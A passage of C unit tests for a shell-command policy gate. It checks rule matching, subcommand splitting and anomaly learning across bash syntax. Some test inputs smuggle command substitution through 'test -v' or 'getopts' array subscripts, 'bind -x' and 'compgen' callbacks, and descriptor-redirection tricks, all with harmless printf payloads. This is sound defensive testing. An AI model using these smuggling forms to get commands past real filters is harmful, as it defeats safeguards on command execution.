  sg_gate_t *gate = gate_with_rules(rules, 2);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));

  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, cases[i].command, &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW);
    ASSERT(result.subcommand_count == cases[i].subcommand_count);
  }
  sg_gate_free(gate);
}

TEST(nested_brace_group_canonical_policy_contract) {
  const char *command =
      "{ { echo one; } | cat; printf two; } > /tmp/nested-brace.out";
  const char *rules[] = {"echo *", "cat", "printf *"};
  sg_gate_t *gate = gate_with_rules(rules, 3);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(result.subcommand_count == 3);
  ASSERT_STR(result.subcommands[0].netargv, "4:echo,3:one,");
  ASSERT_STR(result.subcommands[1].netargv, "3:cat,");
  ASSERT_STR(result.subcommands[2].netargv, "6:printf,3:two,");

  sg_gate_free(gate);
}

TEST(brace_group_maximum_depth_contract) {
  char command[(SHELL_MAX_GROUPS + 1) * 5 + 8];
  size_t length = 0;
  for (uint32_t i = 0; i < SHELL_MAX_GROUPS; i++) {
    memcpy(command + length, "{ ", 2);
    length += 2;
  }
  memcpy(command + length, "cat", 3);
  length += 3;
  for (uint32_t i = 0; i < SHELL_MAX_GROUPS; i++) {
    memcpy(command + length, "; }", 3);
    length += 3;
  }
  command[length] = '\0';

  const char *rules[] = {"cat"};
  sg_gate_t *gate = gate_with_rules(rules, 1);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT(result.subcommand_count == 1);

  memmove(command + 2, command, length + 1);
  memcpy(command, "{ ", 2);
  length += 2;
  memcpy(command + length, "; }", 3);
  length += 3;
  command[length] = '\0';
  memset(&result, 0xA5, sizeof(result));
  ASSERT(eval_cmd(gate, command, &result) == SG_ERR_PARSE);
  sg_gate_free(gate);
}

TEST(strict_heredoc_completion_contract) {
  const char *rules[] = {"cat"};
  sg_gate_t *gate = gate_with_rules(rules, 1);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_result_t result = {0};
  const char *incomplete = "{ cat; } <<-'EOF'\n\tbody\n";
  ASSERT(eval_cmd(gate, incomplete, &result) == SG_ERR_PARSE);
  ASSERT(result.verdict == SG_VERDICT_REJECT);

  memset(&result, 0, sizeof(result));
  const char *mixed_incomplete = "{ cat; } <<E'OF'\nbody\n";
  ASSERT(eval_cmd(gate, mixed_incomplete, &result) == SG_ERR_PARSE);
  ASSERT(result.verdict == SG_VERDICT_REJECT);

  memset(&result, 0, sizeof(result));
  const char *complete = "{ cat; } <<E'OF' <<-\\D'ONE'\r\n"
                         "body\r\n"
                         "EOF\n"
                         "\tsecond\r\n"
                         "\tDONE\r\n";
  ASSERT_SG_OK(eval_cmd(gate, complete, &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(result.subcommand_count == 1);
  ASSERT_STR(result.subcommands[0].netargv, "3:cat,");
  sg_gate_free(gate);
}

TEST(canonical_heredoc_delimiter_contract) {
  static const char *const commands[] = {
      "cat << EOF\nbody\nEOF\nprintf after\n",
      "cat <<\"E\\qF\"\nbody\nE\\qF\nprintf after\n",
      "cat <<\"A B\"\nbody\nA B\nprintf after\n",
      "cat <<A\\ B\nbody\nA B\nprintf after\n",
      "cat <<''\n\nprintf after\n",
      ("cat << EOF <<-\"F\"\r\none\r\nEOF\n\ttwo\r\n\tF\r\n"
       "printf after\n"),
  };
  const char *rules[] = {"cat", "printf after"};
  sg_gate_t *gate = gate_with_rules(rules, 2);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));

  for (size_t i = 0; i < sizeof(commands) / sizeof(commands[0]); i++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, commands[i], &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 2 &&
           !result.requires_substitution_evaluation &&
           !result.has_dynamic_substitution_io);
    ASSERT_STR(result.subcommands[0].netargv, "3:cat,");
    ASSERT_STR(result.subcommands[1].netargv, "6:printf,5:after,");
  }
  sg_gate_free(gate);
}

TEST(brace_local_document_policy_contract) {
  const char *rules[] = {"cat", "printf after"};
  sg_gate_t *gate = gate_with_rules(rules, 2);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));

  static const char *const commands[] = {
      "{ cat <<\"A B\"; printf after; }\nbody\nA B\n",
      "{ cat <<<value; printf after; }",
  };
  for (size_t i = 0; i < sizeof(commands) / sizeof(commands[0]); i++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, commands[i], &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 2);
    ASSERT_STR(result.subcommands[0].netargv, "3:cat,");
    ASSERT_STR(result.subcommands[1].netargv, "6:printf,5:after,");
  }
  sg_gate_free(gate);
}

TEST(nested_composition_matrix) {
  static const struct {
    const char *name;
    const char *rules[6];
    size_t rule_count;
    const char *deny;
    const char *command;
    sg_verdict_t verdict;
    size_t count;
    sg_verdict_t subcommand_verdicts[5];
  } cases[] = {
      {"nested command substitutions",
       {"echo *", "printf x $(whoami)", "whoami"},
       3,
       NULL,
       "echo $(printf x $(whoami))",
       SG_VERDICT_ALLOW_CONDITIONAL,
       3,
       {SG_VERDICT_ALLOW_CONDITIONAL, SG_VERDICT_ALLOW_CONDITIONAL,
        SG_VERDICT_ALLOW}},
      {"multiple substitutions share parent",
       {"echo *", "id", "pwd"},
       3,
       NULL,
       "echo $(id) $(pwd)",
       SG_VERDICT_ALLOW_CONDITIONAL,
       3,
       {SG_VERDICT_ALLOW_CONDITIONAL, SG_VERDICT_ALLOW, SG_VERDICT_ALLOW}},
      {"adjacent substitutions share parent",
       {"echo *", "id", "pwd"},
       3,
       NULL,
       "echo $(id)$(pwd)",
       SG_VERDICT_ALLOW_CONDITIONAL,
       3,
       {SG_VERDICT_ALLOW_CONDITIONAL, SG_VERDICT_ALLOW, SG_VERDICT_ALLOW}},
      {"embedded adjacent substitutions",
       {"echo *", "id", "pwd"},
       3,
       NULL,
       "echo prefix$(id)suffix$(pwd)",
       SG_VERDICT_ALLOW_CONDITIONAL,
       3,
       {SG_VERDICT_ALLOW_CONDITIONAL, SG_VERDICT_ALLOW, SG_VERDICT_ALLOW}},
      {"mixed substitution forms",
       {"echo *", "id", "pwd"},
       3,
       NULL,
       "echo $(id)`pwd`",
       SG_VERDICT_ALLOW_CONDITIONAL,
       3,
       {SG_VERDICT_ALLOW_CONDITIONAL, SG_VERDICT_ALLOW, SG_VERDICT_ALLOW}},
      {"process substitution feeds pipeline",
       {"cat *", "printf x", "sort"},
       3,
       NULL,
       "cat <(printf x) | sort",
       SG_VERDICT_ALLOW,
       3,
       {SG_VERDICT_ALLOW, SG_VERDICT_ALLOW, SG_VERDICT_ALLOW}},
      {"odd escaped process close",
       {"cat *", "printf *"},
       2,
       NULL,
       "cat <(printf \\))",
       SG_VERDICT_ALLOW,
       2,
       {SG_VERDICT_ALLOW, SG_VERDICT_ALLOW}},
      {"even escaped process close",
       {"cat *", "printf *"},
       2,
       NULL,
       "cat <(printf \\\\)",
       SG_VERDICT_ALLOW,
       2,
       {SG_VERDICT_ALLOW, SG_VERDICT_ALLOW}},
      {"substitution precedes boolean stage",
       {"echo *", "id", "pwd"},
       3,
       NULL,
       "echo $(id) && pwd",
       SG_VERDICT_ALLOW_CONDITIONAL,
       3,
       {SG_VERDICT_ALLOW_CONDITIONAL, SG_VERDICT_ALLOW, SG_VERDICT_ALLOW}},
      {"pipeline inside substitution",
       {"echo *", "cat #path", "sort"},
       3,
       NULL,
       "echo $(cat /tmp/a | sort)",
       SG_VERDICT_ALLOW_CONDITIONAL,
       3,
       {SG_VERDICT_ALLOW_CONDITIONAL, SG_VERDICT_ALLOW, SG_VERDICT_ALLOW}},
      {"unmatched nested pipeline stage",
       {"echo *", "cat #path"},
       2,
       NULL,
       "echo $(cat /tmp/a | sort)",
       SG_VERDICT_UNDETERMINED,
       3,
       {SG_VERDICT_ALLOW_CONDITIONAL, SG_VERDICT_ALLOW,
        SG_VERDICT_UNDETERMINED}},
      {"denied nested pipeline stage",
       {"echo *", "cat #path", "sort"},
       3,
       "sort",
       "echo $(cat /tmp/a | sort)",
       SG_VERDICT_DENY,
       3,
       {SG_VERDICT_ALLOW_CONDITIONAL, SG_VERDICT_ALLOW, SG_VERDICT_DENY}},
      {"nested process substitutions",
       {"cat *", "sort *", "cat #path"},
       3,
       NULL,
       "cat <(sort <(cat /tmp/a))",
       SG_VERDICT_ALLOW,
       3,
       {SG_VERDICT_ALLOW, SG_VERDICT_ALLOW, SG_VERDICT_ALLOW}},
  };

  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_gate_t *gate = gate_with_rules(cases[i].rules, cases[i].rule_count);
    ASSERT(gate != NULL);
    /* The outer command is evaluated independently from its executable
     * substitutions. Keep an explicit outer rule so these rows exercise the
     * nested verdict aggregation rather than outer-pattern matching. */
    ASSERT_SG_OK(add_exact_outer_rule(gate, cases[i].command));
    if (cases[i].deny)
      ASSERT_ST_OK(test_policy_replace_cpl(gate, true, cases[i].deny, false));
    ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, cases[i].command, &result));
    if (result.subcommand_count != cases[i].count) {
      fprintf(stderr, "%s: got %u subcommands, expected %zu\n", cases[i].name,
              result.subcommand_count, cases[i].count);
      for (uint32_t j = 0; j < result.subcommand_count; j++)
        fprintf(stderr, "  [%u] '%s' \n", j,
                result.subcommands[j].display_command);
      fail_count++;
      sg_gate_free(gate);
      continue;
    }
    if (result.verdict != cases[i].verdict) {
      fprintf(stderr, "%s: got verdict %s\n", cases[i].name,
              sg_verdict_name(result.verdict));
      for (uint32_t j = 0; j < result.subcommand_count; j++)
        fprintf(stderr, "  [%u] '%s' verdict=%s \n", j,
                result.subcommands[j].display_command,
                sg_verdict_name(result.subcommands[j].verdict));
      fail_count++;
      sg_gate_free(gate);
      continue;
    }
    ASSERT(result.has_dynamic_substitution_io);
    for (size_t j = 0; j < cases[i].count; j++) {

      if (result.subcommands[j].verdict != cases[i].subcommand_verdicts[j])
        fprintf(stderr, "%s command %zu: got %s, expected %s\n", cases[i].name,
                j, sg_verdict_name(result.subcommands[j].verdict),
                sg_verdict_name(cases[i].subcommand_verdicts[j]));
      ASSERT(result.subcommands[j].verdict == cases[i].subcommand_verdicts[j]);
      ASSERT(result.subcommands[j].display_command != NULL);
    }
    sg_gate_free(gate);
  }
}

TEST(nested_quoted_expansion_boundaries) {
  static const struct {
    const char *command;
    uint32_t count;
  } cases[] = {
      {"echo \"${value:-\"x;y\"}\"", 1},
      {"echo \"$(printf \"x;y\")\"", 2},
      {"echo \"`printf \"x;y\"`\"", 2},
      {"echo \"${value:-\"<(printf hi)\"}\"", 1},
      {"echo ${value:-<(printf hi)}", 2},
      {"echo ${value:-$(printf hi)}", 2},
  };
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_gate_t *gate = sg_gate_new();
    ASSERT(gate != NULL);
    ASSERT_SG_OK(add_exact_outer_rule(gate, cases[i].command));
    sg_result_t result;
    sg_error_t status = eval_cmd(gate, cases[i].command, &result);
    if (status != SG_OK || result.subcommand_count != cases[i].count)
      fprintf(stderr, "nested quote case %zu: status=%d count=%u\n", i, status,
              status == SG_OK ? result.subcommand_count : 0);
    ASSERT(status == SG_OK);
    ASSERT_EQ_UINT(result.subcommand_count, cases[i].count);
    sg_gate_free(gate);
  }
}

TEST(dynamic_arithmetic_is_semantically_rejected) {
  sg_gate_t *gate = gate_with_rules((const char *[]){"echo *", "id"}, 2);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_result_t result;
  ASSERT(eval_cmd(gate, "echo $(( $(id) + 1 ))", &result) == SG_ERR_PARSE);
  ASSERT(result.verdict == SG_VERDICT_REJECT && result.subcommand_count == 1 &&
         result.subcommands[0].verdict == SG_VERDICT_REJECT);
  sg_gate_free(gate);
}

TEST(quoted_arithmetic_semantic_contract) {
  sg_gate_t *gate = gate_with_rules((const char *[]){"printf *"}, 1);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  for (size_t i = 0; i < sizeof(shellsplit_test_quoted_arithmetic) /
                             sizeof(shellsplit_test_quoted_arithmetic[0]);
       i++) {
    sg_result_t result;
    sg_error_t status =
        eval_cmd(gate, shellsplit_test_quoted_arithmetic[i].source, &result);
    if (shellsplit_test_quoted_arithmetic[i].supported) {
      ASSERT(status == SG_OK);
      ASSERT(result.verdict != SG_VERDICT_REJECT &&
             result.subcommand_count == 1);
    } else {
      ASSERT(status == SG_ERR_PARSE);
      ASSERT(result.verdict == SG_VERDICT_REJECT);
    }
  }
  sg_gate_free(gate);
}

TEST(builtin_option_semantic_contract) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 1000000.0, NULL));
  static const char *const prefixes[] = {"", "time ", "command ", "builtin "};
  for (size_t c = 0; c < sizeof(prefixes) / sizeof(prefixes[0]); c++) {
    for (size_t i = 0; i < sizeof(shellsplit_test_builtin_options) /
                               sizeof(shellsplit_test_builtin_options[0]);
         i++) {
      char source[1024];
      int length = snprintf(source, sizeof(source), "%s%s", prefixes[c],
                            shellsplit_test_builtin_options[i].source);
      ASSERT(length > 0 && (size_t)length < sizeof(source));
      sg_result_t result;
      sg_error_t status = eval_cmd(gate, source, &result);
      if (shellsplit_test_builtin_options[i].supported) {
        if (status != SG_OK)
          fprintf(stderr, "builtin option gate mismatch: %s status=%d\n",
                  source, status);
        ASSERT(status == SG_OK && result.verdict != SG_VERDICT_REJECT);
      } else {
        ASSERT(status == SG_ERR_PARSE && result.verdict == SG_VERDICT_REJECT);
      }
    }
  }
  sg_gate_free(gate);
}

TEST(completion_and_readline_reject_before_policy_and_learning) {
  const char *rules[] = {"compgen -W *",        "compgen -C * *",
                         "complete -C * *",     "compopt * * *",
                         "bind -x *",           "read * *",
                         "read * * *",          "exec",
                         "printf * *",          "command -v compgen",
                         "command -V complete", "command -v bind"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 1e300, NULL));
  ASSERT_SG_OK(sg_gate_set_anomaly_skip_on_detected(gate, false));
  static const char *const positive[] = {
      "read -r value",      "read -pe value",
      "read -dE value",     "read -p -e value",
      "command -v compgen", "command -V complete",
      "command -v bind",    "printf %s '$(printf nested)'"};
  sg_result_t result = {0};
  for (size_t i = 0; i < sizeof(positive) / sizeof(positive[0]); i++) {
    ASSERT_SG_OK(eval_cmd(gate, positive[i], &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1 &&
           !result.requires_substitution_evaluation &&
           !result.has_dynamic_substitution_io &&
           result.anomaly_update == SG_ANOMALY_UPDATE_APPLIED);
  }
  shell_netstring_buffer_t raw = {0}, type = {0};
  size_t count = 0;
  ASSERT(shell_build_anomaly_netseqs_buffer(positive[0], strlen(positive[0]),
                                            NULL, &raw, &type,
                                            &count) == SHELL_PROCESS_OK);
  sg_anomaly_sequence_score_t before = {0}, after = {0};
  ASSERT_SG_OK(sg_gate_score_anomaly_netseq(gate, (const char *)raw.data,
                                            raw.length, (const char *)type.data,
                                            type.length, &before));
  size_t vocabulary = test_anomaly_vocabulary(gate);
  static const char *const rejected[] = {
      "compgen -W '$(printf nested)'",
      "compgen -C 'printf callback' ordinary",
      "complete -C 'printf callback' ordinary",
      "compopt -o nospace ordinary",
      "bind -x '\"\\C-x\":exec 2>&1'",
      "read -e -r value",
      "read -E -r value",
      "command builtin co'mpgen' -W '$((fd=2))'",
      "time { bind -x '\"\\C-x\":exec 2>&1'; read -e value; }",
      "printf %s \"$(compgen -W '$(printf nested)')\"",
      "exec {fd}>/dev/null; compgen -W '$((fd=2))'; printf x >&$fd",
      "exec {fd}>/dev/null; read -e value; printf x >&$fd",
      "exec {fd}>/dev/null; read -E value; printf x >&$fd",
  };
  for (size_t i = 0; i < sizeof(rejected) / sizeof(rejected[0]); i++) {
    ASSERT(eval_cmd(gate, rejected[i], &result) == SG_ERR_PARSE);
    ASSERT(result.verdict == SG_VERDICT_REJECT &&
           result.subcommand_count == 1 &&
           result.subcommands[0].netargv == NULL &&
           result.subcommands[0].netargv_length == 0 &&
           !result.subcommands[0].matches &&
           result.anomaly_update == SG_ANOMALY_UPDATE_NOT_ATTEMPTED &&
           test_anomaly_vocabulary(gate) == vocabulary);
  }
  ASSERT_SG_OK(sg_gate_score_anomaly_netseq(gate, (const char *)raw.data,
                                            raw.length, (const char *)type.data,
                                            type.length, &after));
  ASSERT(before.raw_score == after.raw_score &&
         before.type_score == after.type_score);
  shell_netstring_buffer_free(&raw);
  shell_netstring_buffer_free(&type);
  sg_gate_free(gate);
}

TEST(variable_predicates_reject_before_policy_and_learning) {
  sg_gate_t *gate = gate_with_rules(
      (const char *[]){"test * *", "test * * *", "\"[\" * * *",
                       "test * * * * * *", "\"[\" * * * * * * *"},
      5);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 1e300, NULL));
  ASSERT_SG_OK(sg_gate_set_anomaly_skip_on_detected(gate, false));
  static const char *const positive[] = {
      "test -v scalar",
      "[ -v scalar ]",
      "test -f \"$path\"",
      "test -v = 'a[$(printf marker >&2)]'",
      "test \"$mode\" = release -a -f config",
      "test -f config -a \"$mode\" = release",
      "[ \"$mode\" = release -a -f config ]",
      "[ -f config -a \"$mode\" = release ]",
  };
  sg_result_t result = {0};
  for (size_t i = 0; i < sizeof(positive) / sizeof(positive[0]); i++) {
    ASSERT_SG_OK(eval_cmd(gate, positive[i], &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW &&
           !result.requires_substitution_evaluation &&
           result.anomaly_update == SG_ANOMALY_UPDATE_APPLIED);
  }
  shell_netstring_buffer_t raw = {0}, type = {0};
  size_t stages = 0;
  ASSERT(shell_build_anomaly_netseqs_buffer(positive[0], strlen(positive[0]),
                                            NULL, &raw, &type,
                                            &stages) == SHELL_PROCESS_OK);
  sg_anomaly_sequence_score_t before = {0}, after = {0};
  ASSERT_SG_OK(sg_gate_score_anomaly_netseq(gate, (const char *)raw.data,
                                            raw.length, (const char *)type.data,
                                            type.length, &before));
  size_t vocabulary = test_anomaly_vocabulary(gate);
  static const char *const rejected[] = {
      "test -v 'a[$(printf marker >&2)]'",
      "[ -v 'a[$(printf marker >&2)]' ]",
      "test ! -v 'a[0]'",
      "test -n x -a -v \"$ref\"",
      "test \"$mode\" = release -a -v 'a[0]'",
      "[ -f config -a \"$mode\" = release -o -v 'a[0]' ]",
      "command builtin test \"$mode\" = release -a -v 'a[0]'",
      "time [ \"$mode\" = release -a -v 'a[0]' ]",
      "test \"$operator\" = = 'a[0]' -a -v 'a[0]'",
      "[ \"$operator\" = \"$other\" 'a[0]' -a -v 'a[0]' ]",
      "command builtin test \"$operator\" = = 'a[0]' -a \"$lookup\" 'a[0]'",
      "command builtin test -v 'a[0]'",
      "time [ -v 'a[0]' ]",
      "{ test -v 'a[0]'; }",
      "printf \"$(test -v 'a[0]')\"",
  };
  for (size_t i = 0; i < sizeof(rejected) / sizeof(rejected[0]); i++) {
    ASSERT(eval_cmd(gate, rejected[i], &result) == SG_ERR_PARSE);
    ASSERT(result.verdict == SG_VERDICT_REJECT &&
           result.anomaly_update == SG_ANOMALY_UPDATE_NOT_ATTEMPTED &&
           test_anomaly_vocabulary(gate) == vocabulary);
  }
  ASSERT_SG_OK(sg_gate_score_anomaly_netseq(gate, (const char *)raw.data,
                                            raw.length, (const char *)type.data,
                                            type.length, &after));
  ASSERT(before.raw_score == after.raw_score &&
         before.type_score == after.type_score);
  shell_netstring_buffer_free(&raw);
  shell_netstring_buffer_free(&type);
  sg_gate_free(gate);
}

TEST(getopts_rejects_before_policy_and_learning) {
  const char *rules[] = {"getopts * * *"};
  sg_gate_t *gate = gate_with_rules(rules, 1);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, true, "printf *", false));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 1e300, NULL));
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, "getopts a name -a", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1);
  size_t vocabulary = test_anomaly_vocabulary(gate);
  shell_netstring_buffer_t raw = {0}, type = {0};
  size_t count = 0;
  static const char reference[] = "getopts a name -a";
  ASSERT(shell_build_anomaly_netseqs_buffer(reference, sizeof(reference) - 1,
                                            NULL, &raw, &type,
                                            &count) == SHELL_PROCESS_OK);
  sg_anomaly_sequence_score_t before, after;
  ASSERT_SG_OK(sg_gate_score_anomaly_netseq(gate, (const char *)raw.data,
                                            raw.length, (const char *)type.data,
                                            type.length, &before));
  static const char *const rejected[] = {
      "a='x[$(printf hidden >&2)0]' getopts a OPTIND -a",
      "a='x[$(printf hidden >&2)0]' command builtin getopts a OPTIND -a",
      "getopts a \"$target\" -a",
      "getopts \"$spec\" name OPTIND",
      "time { getopts -- a OPTIND -a; }",
  };
  for (size_t i = 0; i < sizeof(rejected) / sizeof(rejected[0]); i++) {
    ASSERT(eval_cmd(gate, rejected[i], &result) == SG_ERR_PARSE);
    ASSERT(result.verdict == SG_VERDICT_REJECT && result.subcommand_count == 1);
    ASSERT(result.subcommands[0].netargv == NULL &&
           result.subcommands[0].netargv_length == 0 &&
           !result.subcommands[0].matches);
    ASSERT(result.anomaly_update == SG_ANOMALY_UPDATE_NOT_ATTEMPTED &&
           test_anomaly_vocabulary(gate) == vocabulary);
  }
  ASSERT_SG_OK(sg_gate_score_anomaly_netseq(gate, (const char *)raw.data,
                                            raw.length, (const char *)type.data,
                                            type.length, &after));
  ASSERT(before.raw_score == after.raw_score &&
         before.type_score == after.type_score);
  shell_netstring_buffer_free(&raw);
  shell_netstring_buffer_free(&type);
  sg_gate_free(gate);
}

TEST(getopts_preserves_unrelated_descriptor_policy) {
  const char *rules[] = {"exec",
                         "printf x",
                         "getopts",
                         "getopts a",
                         "getopts a opt -a",
                         "getopts -- a opt -a",
                         "command builtin getopts a opt -a",
                         "getopts a invalid-name -a",
                         "getopts a UID -a",
                         "getopts -x opt -a"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 1e300, NULL));
  static const char *const sources[] = {
      "exec {fd}>/tmp/getopts-route; getopts a opt -a; printf x >&$fd",
      "exec {fd}>/tmp/getopts-route; getopts -- a opt -a; printf x >&\"$fd\"",
      "exec {fd}>/tmp/getopts-route; command builtin getopts a opt -a; "
      "printf x >&$fd",
      "exec {fd}>/tmp/getopts-route; getopts; printf x >&$fd",
      "exec {OPTARG}>/tmp/getopts-route; getopts a; printf x >&$OPTARG",
      "exec {fd}>/tmp/getopts-route; getopts a 'invalid-name' -a; printf x "
      ">&$fd",
      "exec {fd}>/tmp/getopts-route; getopts a UID -a; printf x >&$fd",
      "exec {OPTIND}>/tmp/getopts-route; getopts -x opt -a; printf x >&$OPTIND",
      "exec {fd}>/tmp/getopts-route; getopts a opt -a >&$fd; "
      "time -p printf x >&$fd",
  };
  sg_result_t result;
  for (size_t i = 0; i < sizeof(sources) / sizeof(sources[0]); i++) {
    ASSERT_SG_OK(eval_cmd(gate, sources[i], &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 3);
    for (size_t j = 0; j < result.subcommand_count; j++)
      ASSERT(result.subcommands[j].verdict == SG_VERDICT_ALLOW);
    ASSERT_STR(result.subcommands[2].netargv, "6:printf,1:x,");
    ASSERT(result.anomaly_update == SG_ANOMALY_UPDATE_APPLIED);
  }

  size_t vocabulary = test_anomaly_vocabulary(gate);
  ASSERT(eval_cmd(gate,
                  "exec {OPTARG}>/tmp/getopts-route; getopts a opt -a; "
                  "printf x >&$OPTARG",
                  &result) == SG_ERR_PARSE);
  ASSERT(result.verdict == SG_VERDICT_REJECT &&
         result.anomaly_update == SG_ANOMALY_UPDATE_NOT_ATTEMPTED &&
         test_anomaly_vocabulary(gate) == vocabulary);
  ASSERT_ST_OK(test_policy_replace_cpl(gate, true, "printf x", false));
  ASSERT_SG_OK(eval_cmd(gate, sources[0], &result));
  ASSERT(result.verdict == SG_VERDICT_DENY && result.subcommand_count == 3 &&
         result.subcommands[2].verdict == SG_VERDICT_DENY);
  sg_gate_free(gate);
}

TEST(cd_descriptor_effect_policy_contract) {
  const char *rules[] = {"exec", "cd /", "cd --invalid", "printf x",
                         "command builtin cd /"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 1e300, NULL));
  static const struct {
    const char *source;
    uint32_t count;
  } sources[] = {
      {"exec {fd}>/tmp/cd-route; cd / 2>&1; printf x >&$fd", 3},
      {"exec {fd}>/tmp/cd-route; command builtin cd /; printf x >&$fd", 3},
      {"exec {PWD}>/tmp/cd-route; (cd /); printf x >&$PWD", 3},
      {"exec {PWD}>/tmp/cd-route; cd --invalid; printf x >&$PWD", 3},
      {"exec {PWD}>/tmp/cd-route; cd / || printf x >&$PWD", 3},
  };
  sg_result_t result;
  for (size_t i = 0; i < sizeof(sources) / sizeof(sources[0]); i++) {
    ASSERT_SG_OK(eval_cmd(gate, sources[i].source, &result));
    if (result.verdict != SG_VERDICT_ALLOW ||
        result.subcommand_count != sources[i].count)
      fprintf(stderr, "cd policy case %zu: %s (%d, %u)\n", i, sources[i].source,
              result.verdict, result.subcommand_count);
    ASSERT(result.verdict == SG_VERDICT_ALLOW &&
           result.subcommand_count == sources[i].count);
    for (size_t command = 0; command < result.subcommand_count; command++)
      ASSERT(result.subcommands[command].verdict == SG_VERDICT_ALLOW);
    ASSERT_STR(result.subcommands[result.subcommand_count - 1].netargv,
               "6:printf,1:x,");
    ASSERT(result.anomaly_update == SG_ANOMALY_UPDATE_APPLIED);
  }
  static const char *const overwritten[] = {
      "exec {PWD}>/tmp/cd-route; cd /; printf x >&$PWD",
      "exec {OLDPWD}>/tmp/cd-route; cd /; printf x >&$OLDPWD",
      "exec {PWD}>/tmp/cd-route; time -p cd /; printf x >&$PWD",
      "exec {PWD}>/tmp/cd-route; cd /; cat < <(printf x >&$PWD)",
  };
  size_t vocabulary = test_anomaly_vocabulary(gate);
  for (size_t i = 0; i < sizeof(overwritten) / sizeof(overwritten[0]); i++) {
    ASSERT(eval_cmd(gate, overwritten[i], &result) == SG_ERR_PARSE);
    ASSERT(result.verdict == SG_VERDICT_REJECT &&
           result.anomaly_update == SG_ANOMALY_UPDATE_NOT_ATTEMPTED &&
           test_anomaly_vocabulary(gate) == vocabulary);
  }
  ASSERT_ST_OK(test_policy_replace_cpl(gate, true, "printf x", false));
  ASSERT_SG_OK(eval_cmd(gate, sources[0].source, &result));
  ASSERT(result.verdict == SG_VERDICT_DENY && result.subcommand_count == 3 &&
         result.subcommands[2].verdict == SG_VERDICT_DENY);
  sg_gate_free(gate);
}

TEST(locale_quote_scope_policy_contract) {
  const char *rules[] = {"echo *", "printf *"};
  sg_gate_t *gate = gate_with_rules(rules, 2);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 1e300, NULL));
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, "echo \"`printf '\"$\"literal\"'`\"", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL &&
         result.subcommand_count == 2 &&
         result.requires_substitution_evaluation);
  size_t vocabulary = test_anomaly_vocabulary(gate);
  static const char *const rejected[] = {
